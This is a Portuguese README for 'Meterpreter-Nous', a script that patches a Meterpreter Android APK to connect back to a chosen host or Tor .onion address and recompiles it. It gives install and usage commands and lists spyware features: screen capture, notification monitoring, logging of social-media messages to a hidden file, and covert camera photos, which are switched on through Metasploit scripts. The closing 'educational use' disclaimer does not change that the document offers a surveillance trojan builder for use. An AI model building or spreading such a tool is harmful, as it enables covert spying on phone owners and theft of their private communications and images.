# **Meterpreter-Nous**  

**Meterpreter-Nous** é um script que modifica e recompila um APK, permitindo configurar conexões dinâmicas com ou sem o uso de Tor.  

---

## **Funcionalidades**  

- Modifica o arquivo `Payload.smali` para definir um novo **host** e **porta**.  
- Suporte a hosts `.onion` para conexões via **Tor**.  
- Compilação automatizada do APK modificado.  

---

## **Requisitos**  

Certifique-se de ter os seguintes componentes instalados:  

- [Python 3.x](https://www.python.org/)  
- [apktool](https://github.com/iBotPeaches/Apktool)  
- [Java](https://www.java.com/)  

---

## **Instalação**  

Clone o repositório e acesse o diretório:  

- git clone https://github.com/mikelkarma/Meterpreter-Nous  
- cd Meterpreter-Nous  
- sh install.sh # Para sistemas Debian  

---

## **Uso**  

Defina o host e a porta diretamente na linha de comando:  

- python nous.py --host <IP ou domínio> --porta <porta> --tor <true/false>  

Exemplos:  

1. Configuração de um host sem Tor:  

   - python nous.py --host 192.168.0.1 --porta 8080 --tor false  

2. Configuração de um host `.onion` com Tor:  

   - python nous.py --host exemplo.onion --porta 8080 --tor true  

---

## **Recursos do APK Modificado**  

O APK gerado possui funcionalidades como:  

- Captura de tela em tempo real.  
- Monitoramento de notificações de aplicativos.  
- Captura de textos exibidos na tela, permitindo registrar mensagens de redes sociais.  
- Armazenamento das mensagens capturadas no diretório `/sdcard/.nous/key.sql`.  
- Captura de imagens da câmera frontal e traseira ao criar os arquivos `web1` e `web2` no diretório `/sdcard/.nous/`, gerando as imagens em `.photo.nous`.  
- E funcionalidades do meterpreter

Os scripts para ativação dessas funções no Metasploit estão disponíveis em `msf-scripts`. Para utilizá-los, copie-os para o seu ambiente e execute:  

- meterpreter> run <script>  

---

## **Aviso Legal**  

Este código é disponibilizado exclusivamente para fins educacionais e de pesquisa.  

- Não há garantias de funcionamento ou segurança.  
- O uso deste código é de responsabilidade do usuário.  
- O autor não se responsabiliza por qualquer uso indevido ou ilegal deste software.  

Utilize este código de maneira ética e dentro dos limites da lei.
